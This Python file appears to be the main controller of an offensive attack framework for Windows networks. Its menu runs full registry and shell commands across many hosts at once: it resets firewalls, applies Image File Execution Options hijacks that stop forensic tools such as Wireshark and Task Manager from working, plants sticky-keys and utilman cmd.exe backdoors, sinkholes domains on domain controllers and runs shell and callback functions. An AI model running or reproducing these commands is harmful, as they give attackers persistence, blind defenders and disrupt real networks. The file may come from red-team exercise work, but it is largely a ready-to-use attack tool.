import subprocess
import InquirerPy.inquirer as inquirer

# Import other python files
from Server.config_loader import load_config
from Server.styles import text_style
from Server.shell import shell_execution
from Server.interfaces import select_local_ip
from Server.callbacks import display_callbacks
from Server.display import main_interface, ascii_art
from Server.execute import singular_execution, mass_execution

def main():
    # Startup sequence
    subprocess.run("clear")
    ascii_art()

    # Load configuration
    CONFIG = load_config()
    
    # Show local IP at startup
    selected_ip = select_local_ip()
    print()
    
    while True:
        action = main_interface()
        if action is None:
            print("Goodbye.")
            break
            
        if action == "SINGULAR":
            singular_execution()
        elif action == "MASS":
            mass_execution()
        elif action == "SHELL":
            shell_execution(selected_ip)
        elif action == "FIREWALL":
            command = "netsh advfirewall reset"
            mass_execution(command)
        elif action == "IFEO":
            target_processes = (
                "wireshark.exe", "taskmgr.exe", "autoruns.exe", "autoruns64.exe",
                "procexp.exe", "procexp64.exe", "procmon.exe", "procmon64.exe", 
                "strings.exe"
            )
    
            processes_string = " ".join(target_processes)
            command = (
                f"for %i in ({processes_string}) do @reg add "
                f"\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%i\" "
                f"/v Debugger /t REG_SZ /d \"cmd.exe /c del /f /q \"%i\"\" /f"
            )
            mass_execution(command)
        elif action == "UTILITY":
            target_processes = (
                "sethc.exe", "utilman.exe", "osk.exe", "displayswitch.exe",
                "magnify.exe", "narrator.exe"
            )

            processes_string = " ".join(target_processes)
            command = (
                f"reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_SZ /d \"\" /f & "
                f"reg add \"HKCU\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"510\" /f & "
                f"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\" /v \"Configuration\" /t REG_SZ /d \"stickykeys\" /f & "
                f"for %i in ({processes_string}) do @reg add "
                f"\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%i\" "
                f"/v Debugger /t REG_SZ /d cmd.exe /f"
            )
            mass_execution(command)
        elif action == "SSH":
            print("SSH Key Dropping coming soon!")
        elif action == "SINKHOLE":
            domains = inquirer.text(
                message="Enter domains to sinkhole using DNS (e.g., github.com,gitlab.com):",
                style=text_style
            ).execute()
            domains = domains.split(",")
            full_command = ""
            for domain in domains:
                command = (
                    f"powershell -c Add-DnsServerPrimaryZone -Name \"{domain}\" -ReplicationScope \"Domain\" -DynamicUpdate \"None\"; "
                    f"powershell -c Add-DnsServerResourceRecordA -Name \"*\" -ZoneName \"{domain}\" -IPv4Address \"8.8.8.8\"; "
                )
                full_command += command
            full_command = full_command[:-2]
            mass_execution(full_command, targets=CONFIG.hosts.ALL_DC)
        elif action == "CALLBACK":
            command = "whoami"
            mass_execution(command, callback=True)
        elif action == "VIEW_CALLBACKS":
            display_callbacks()
        else:
            print("Unknown action, returning to menu.")
        
        print()

if __name__ == "__main__":
    main()